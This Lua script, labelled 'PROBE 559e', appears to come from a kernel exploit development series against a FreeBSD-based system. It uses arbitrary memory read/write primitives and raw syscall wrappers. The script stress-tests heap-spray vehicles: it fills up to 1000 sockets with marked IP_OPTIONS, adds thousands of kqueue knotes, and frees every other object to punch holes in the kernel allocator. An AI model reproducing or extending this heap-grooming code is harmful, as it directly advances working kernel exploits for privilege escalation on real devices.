-- CRASH_CLASS: LOW
-- PROBE 559e: Spray vehicle stress test — limits and sizing
--
-- 559c confirmed: IP_OPTIONS(4-40B), kqueue knotes, SHM all work.
-- pipe2(542) blocked. Test:
-- A) pipe(42) old syscall
-- B) IP_OPTIONS mass spray — how many sockets with options?
-- C) kqueue knote mass spray — how many knotes per kqueue? how many kqueues?
-- D) IP_OPTIONS read-back (getsockopt) to verify content integrity
-- E) knote size estimation via timing/fd count correlation

print("=== PROBE 559e: SPRAY STRESS ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rb(a)
    local d = rd(a); if d == nil then return nil end
    if d < 0 then d = d + 0x100000000 end; return d
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function zero(b, n) for off = 0, n-4, 4 do wd(b+off, 0) end end

local Z = uint64(0)
local sc3   = mk(3)
local sc4   = mk(4)
local sc6   = mk(6)
local sc20  = mk(20)
local sc42  = mk(42)   -- pipe (old)
local sc97  = mk(97)
local sc105 = mk(105)
local sc118 = mk(118)  -- getsockopt
local sc135 = mk(135)
local sc362 = mk(362)
local sc363 = mk(363)
local sc542 = mk(542)

local pid = N(sc20())
print("pid=" .. pid)
io.flush()

-- ============================================================
-- A) OLD PIPE(42) TEST
-- ============================================================
print("")
print("--- A: pipe(42) ---")
io.flush()

-- pipe(42) on FreeBSD returns rd in eax, wr in edx (dual return)
-- From Lua, this might not work the same way. Try anyway.
local ok_p42, rv_p42 = pcall(function() return sc42() end)
local p42rv = ok_p42 and N(rv_p42) or -999
print("pipe(42)=" .. p42rv)

-- Also try pipe2 with O_CLOEXEC flag (0x100000)
local pf2 = memory.alloc(8)
local ok_p2c, rv_p2c = pcall(function()
    return sc542(uint64(pf2), uint64(0x100000))
end)
print("pipe2(O_CLOEXEC)=" .. (ok_p2c and N(rv_p2c) or -999))

-- And with flags=0x4 (O_NONBLOCK mapped differently on FreeBSD)
local ok_p2n, rv_p2n = pcall(function()
    return sc542(uint64(pf2), uint64(4))
end)
print("pipe2(O_NONBLOCK)=" .. (ok_p2n and N(rv_p2n) or -999))

-- Try socketpair as pipe alternative (already known to work)
local spf = memory.alloc(8)
local ok_sp, rv_sp = pcall(function()
    return sc135(uint64(1), uint64(2), Z, uint64(spf))
end)
local sp_rv = ok_sp and N(rv_sp) or -999
print("socketpair(AF_UNIX,DGRAM)=" .. sp_rv)
if sp_rv == 0 then
    local s0 = rd(spf) or -1
    local s1 = rd(spf + 4) or -1
    print("  fds=" .. s0 .. "," .. s1)
    pcall(function() sc6(uint64(s0)) end)
    pcall(function() sc6(uint64(s1)) end)
end
io.flush()

-- ============================================================
-- B) IP_OPTIONS MASS SPRAY
-- ============================================================
print("")
print("--- B: IP_OPTIONS mass spray ---")
io.flush()

local opt_buf = memory.alloc(44)
local spray_fds = {}
local spray_count = 0

-- Create UDP sockets with IP_OPTIONS set
for i = 1, 1000 do
    local ok_s, sfd = pcall(function()
        return sc97(uint64(2), uint64(2), uint64(17))
    end)
    if not ok_s or N(sfd) < 0 then
        print(string.format("  socket fail at %d", i))
        break
    end

    -- Set IP_OPTIONS with controlled content (40 bytes)
    zero(opt_buf, 44)
    -- Fill with pattern: each socket gets unique marker
    wd(opt_buf, 0xAAAA0000 + i)
    wd(opt_buf + 4, 0xBBBB0000 + i)
    wd(opt_buf + 8, 0xCCCC0000 + i)
    wd(opt_buf + 12, 0x01010101)  -- NOP padding
    wd(opt_buf + 16, 0x01010101)
    wd(opt_buf + 20, 0x01010101)
    wd(opt_buf + 24, 0x01010101)
    wd(opt_buf + 28, 0x01010101)
    wd(opt_buf + 32, 0x01010101)
    wd(opt_buf + 36, 0xDDDD0000 + i)

    local ok_o, rv_o = pcall(function()
        return sc105(uint64(N(sfd)), Z, uint64(6), uint64(opt_buf), uint64(40))
    end)
    if ok_o and N(rv_o) == 0 then
        spray_count = spray_count + 1
        spray_fds[spray_count] = N(sfd)
    else
        pcall(function() sc6(uint64(N(sfd))) end)
        print(string.format("  IP_OPTIONS fail at %d", i))
        break
    end

    if i == 100 or i == 500 or i == 1000 then
        print(string.format("  %d sockets with IP_OPTIONS OK", spray_count))
        io.flush()
    end
end
print(string.format("  TOTAL: %d sockets with 40B IP_OPTIONS", spray_count))
io.flush()

-- Verify content integrity — read back from middle socket
if spray_count >= 50 then
    local test_idx = 25
    local test_fd = spray_fds[test_idx]
    local get_buf = memory.alloc(44)
    local get_len = memory.alloc(4)
    zero(get_buf, 44)
    wd(get_len, 44)

    local ok_g, rv_g = pcall(function()
        return sc118(uint64(test_fd), Z, uint64(6), uint64(get_buf), uint64(get_len))
    end)
    local grv = ok_g and N(rv_g) or -999
    local g0 = rb(get_buf) or 0
    local g1 = rb(get_buf + 4) or 0
    local g9 = rb(get_buf + 36) or 0
    local glen = rd(get_len) or 0
    print(string.format("  readback socket %d: rv=%d len=%d [%08X %08X ... %08X]",
        test_idx, grv, glen, g0, g1, g9))
    local expect0 = 0xAAAA0000 + test_idx
    if expect0 > 0xFFFFFFFF then expect0 = expect0 - 0x100000000 end
    print(string.format("  expect: [%08X %08X ... %08X]",
        expect0, 0xBBBB0000 + test_idx, 0xDDDD0000 + test_idx))
end
io.flush()

-- Close half, verify other half still intact
if spray_count >= 100 then
    -- Free every other socket (holes in the allocator)
    local freed = 0
    for i = 1, spray_count, 2 do
        pcall(function() sc6(uint64(spray_fds[i])) end)
        spray_fds[i] = -1
        freed = freed + 1
    end
    print(string.format("  freed %d (every other), %d remain", freed, spray_count - freed))

    -- Verify remaining socket content
    local intact = 0
    local corrupt = 0
    for i = 2, math.min(spray_count, 200), 2 do
        if spray_fds[i] >= 0 then
            zero(get_buf, 44)
            wd(get_len, 44)
            local ok_v, rv_v = pcall(function()
                return sc118(uint64(spray_fds[i]), Z, uint64(6),
                    uint64(get_buf), uint64(get_len))
            end)
            if ok_v and N(rv_v) == 0 then
                local v0 = rb(get_buf) or 0
                local expect = 0xAAAA0000 + i
                if expect > 0xFFFFFFFF then expect = expect - 0x100000000 end
                if v0 == expect then
                    intact = intact + 1
                else
                    corrupt = corrupt + 1
                    if corrupt <= 3 then
                        print(string.format("  CORRUPT socket %d: got %08X expect %08X",
                            i, v0, expect))
                    end
                end
            end
        end
    end
    print(string.format("  after free: %d intact, %d corrupt", intact, corrupt))
end

-- Cleanup remaining
for i = 1, spray_count do
    if spray_fds[i] and spray_fds[i] >= 0 then
        pcall(function() sc6(uint64(spray_fds[i])) end)
    end
end
io.flush()

-- ============================================================
-- C) KQUEUE KNOTE MASS SPRAY
-- ============================================================
print("")
print("--- C: kqueue knote mass ---")
io.flush()

local ok_kq, kqfd = pcall(function() return sc362() end)
kqfd = ok_kq and N(kqfd) or -1
print("kqueue=" .. kqfd)

if kqfd >= 0 then
    local kev = memory.alloc(64)
    local knote_count = 0

    -- Try to add thousands of EVFILT_USER knotes
    for i = 1, 5000 do
        zero(kev, 32)
        wq(kev + 0, uint64(i))
        wd(kev + 8, 0x0001FFF5)  -- EVFILT_USER + EV_ADD
        wd(kev + 12, 0)
        wq(kev + 16, Z)
        wq(kev + 24, uint64(0xFACE0000 + i))

        local ok_k, rv_k = pcall(function()
            return sc363(uint64(kqfd), uint64(kev), uint64(1), Z, Z, Z)
        end)
        if ok_k and N(rv_k) >= 0 then
            knote_count = knote_count + 1
        else
            print(string.format("  knote fail at %d", i))
            break
        end

        if i == 100 or i == 500 or i == 1000 or i == 2000 or i == 5000 then
            print(string.format("  %d knotes OK", knote_count))
            io.flush()
        end
    end
    print(string.format("  TOTAL: %d knotes", knote_count))

    -- Delete half (create holes)
    local del_count = 0
    for i = 1, knote_count, 2 do
        zero(kev, 32)
        wq(kev + 0, uint64(i))
        -- EV_DELETE = 0x0002, EVFILT_USER = 0xFFF5
        wd(kev + 8, 0x0002FFF5)

        local ok_d, rv_d = pcall(function()
            return sc363(uint64(kqfd), uint64(kev), uint64(1), Z, Z, Z)
        end)
        if ok_d and N(rv_d) >= 0 then del_count = del_count + 1 end
    end
    print(string.format("  deleted %d knotes (holes created)", del_count))

    pcall(function() sc6(uint64(kqfd)) end)
end
io.flush()

-- ============================================================
-- D) SOCKETPAIR MASS CREATION (pipe alternative)
-- ============================================================
print("")
print("--- D: socketpair mass ---")
io.flush()

local sp_count = 0
for i = 1, 500 do
    local spf2 = memory.alloc(8)
    local ok_s2, rv_s2 = pcall(function()
        return sc135(uint64(1), uint64(2), Z, uint64(spf2))
    end)
    if ok_s2 and N(rv_s2) == 0 then
        sp_count = sp_count + 1
        local s0 = rd(spf2) or -1
        local s1 = rd(spf2 + 4) or -1
        pcall(function() sc6(uint64(s0)) end)
        pcall(function() sc6(uint64(s1)) end)
    else
        break
    end
end
print(string.format("socketpair: %d created+closed", sp_count))
io.flush()

print("")
local pid2 = N(sc20())
print("pid=" .. pid2 .. (pid2 == pid and " OK" or " DEAD"))
print("=== 559e DONE ===")
